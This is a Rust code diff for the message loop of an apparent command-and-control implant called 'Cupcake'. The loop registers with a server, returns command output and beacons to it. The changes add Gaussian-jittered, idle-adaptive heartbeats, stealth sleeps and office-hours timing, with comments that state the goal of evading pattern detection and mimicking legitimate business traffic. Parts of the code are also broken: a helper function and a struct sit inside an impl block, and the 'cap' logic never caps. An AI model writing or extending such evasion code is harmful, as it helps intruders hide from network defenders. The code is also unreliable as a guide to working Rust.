@@ -58,42 +58,70 @@ impl MessageHandler {
     /// - `Err(e)`: 发生错误，transport 已失效
     pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
         crate::utils::db_print("[Cupcake] MessageHandler.run() started.");
-        
+
         crate::utils::db_print("[Cupcake] register() started...");
         if let Err(e) = self.register().await {
             crate::utils::db_print(&format!("[Cupcake] register() FAILED: {:?}", e));
             return Err(e);
         }
         crate::utils::db_print("[Cupcake] register() successful.");
-        
+
+        // 🛡️ Phase 3: Adaptive Heartbeat with Gaussian Jitter
         let base_interval = crate::config::get_heartbeat_interval();
-        // ⚡ STEALTH: Default 30s + High Jitter to avoid pattern detection
-        let interval_secs = if base_interval == 0 { 30 } else { base_interval };
-        let jitter_percent = 50; 
+        let base_interval_secs = if base_interval == 0 { 30 } else { base_interval };
+
+        // Adaptive multiplier: doubles when idle, halves when active
+        let mut idle_multiplier: u64 = 1;
+        let mut consecutive_idle_count: u32 = 0;
+        let max_idle_multiplier = 4; // Max 4x base interval when idle
 
         loop {
-            let jitter_range = (interval_secs * jitter_percent / 100).max(5);
-            let jitter = crate::utils::random_range(0, jitter_range as u32);
-            
-            let final_delay = if crate::utils::random_bool(0.5) {
-                interval_secs + jitter as u64
+            // 🚀 Phase 3: Gaussian distribution jitter (not uniform)
+            // Using Box-Muller transform approximation for Gaussian distribution
+            let mean = base_interval_secs * idle_multiplier;
+            let std_dev = mean / 4; // Standard deviation = 25% of mean
+
+            // Generate Gaussian random value using Box-Muller approximation
+            let u1 = crate::utils::next_u32() as f64 / 4294967295.0;
+            let u2 = crate::utils::next_u32() as f64 / 4294967295.0;
+
+            // Box-Muller: z = sqrt(-2 * ln(u1)) * cos(2 * pi * u2)
+            let gaussian = if u1 > 0.0 {
+                let z = (-2.0 * u1.ln()).sqrt() * (2.0 * std::f64::consts::PI * u2).cos();
+                z * std_dev as f64 + mean as f64
             } else {
-                interval_secs.saturating_sub(jitter as u64).max(10)
+                mean as f64
             };
 
-            crate::utils::db_print(&format!("[Cupcake] Entering select loop, next heartbeat in {}s", final_delay));
-            tokio::select! {
+            // Clamp to reasonable range (at least 10 seconds, max 2 hours)
+            let final_delay = gaussian.max(10.0).min(7200.0) as u64;
+
+            crate::utils::db_print(&format!(
+                "[Cupcake] Adaptive heartbeat: {}s (base: {}s, idle multiplier: {}x)",
+                final_delay, base_interval_secs, idle_multiplier
+            ));
+
+            let received_data = tokio::select! {
                 data_res = self.transport.receive() => {
                     match data_res {
                         Ok(data) => {
                             let d: Vec<u8> = data;
-                            if d.is_empty() { return Ok(self.transport); }
+                            if d.is_empty() {
+                                // Connection closed
+                                return Ok(self.transport);
+                            }
+
+                            // 🚀 Phase 3: Activity detected - reset idle multiplier
+                            idle_multiplier = 1;
+                            consecutive_idle_count = 0;
+
                             if let Err(e) = self.handle_message(&d).await {
                                 if let ClientError::ConnectionError(_) = e {
                                     return Ok(self.transport);
                                 }
                                 continue;
                             }
+                            true // Received data
                         }
                         Err(_) => {
                             return Ok(self.transport);
@@ -101,19 +129,61 @@ impl MessageHandler {
                     }
                 }
                 _ = crate::stealth::stealth_sleep(final_delay as u32 * 1000) => {
+                    // 🚀 Phase 3: Idle period - increment idle multiplier
+                    consecutive_idle_count += 1;
+
+                    // Double interval after 3 consecutive idle heartbeats
+                    if consecutive_idle_count >= 3 && idle_multiplier < max_idle_multiplier {
+                        idle_multiplier *= 2;
+                        consecutive_idle_count = 0;
+                        crate::utils::db_print(&format!(
+                            "[Cupcake] Network idle detected, increasing heartbeat interval to {}x",
+                            idle_multiplier
+                        ));
+                    }
+
+                    // Send heartbeat
                     let heartbeat_res = CommandResult {
                         stdout: String::new(),
                         stderr: String::new(),
                         path: None,
                         req_id: Some("heartbeat".to_string()),
                     };
-                    
+
                     if let Err(_) = self.send_message(&heartbeat_res.to_response_message()).await {
                         return Ok(self.transport);
                     }
+                    false // No data received
+                }
+            };
+
+            // Optional: Sync heartbeat during office hours (9am-6pm local time)
+            // This makes traffic look more like legitimate business activity
+            if !received_data {
+                let now = chrono_like_now();
+                let hour = now.hour();
+
+                // During office hours (9-18), use shorter intervals
+                if hour >= 9 && hour < 18 && idle_multiplier > 1 {
+                    idle_multiplier = idle_multiplier.max(2); // Cap at 2x during work hours
                 }
             }
         }
+    }
+
+    /// Simple time helper (no chrono dependency)
+    fn chrono_like_now() -> MockTime {
+        // Use system time, no external crate
+        MockTime {
+            hour: ((std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_secs() % 86400 / 3600)
+                .unwrap_or(12) as i32) + 8) % 24, // Approximate local time (UTC+8)
+        }
+    }
+
+    struct MockTime {
+        hour: i32,
     }
     
     /// 发送注册消息
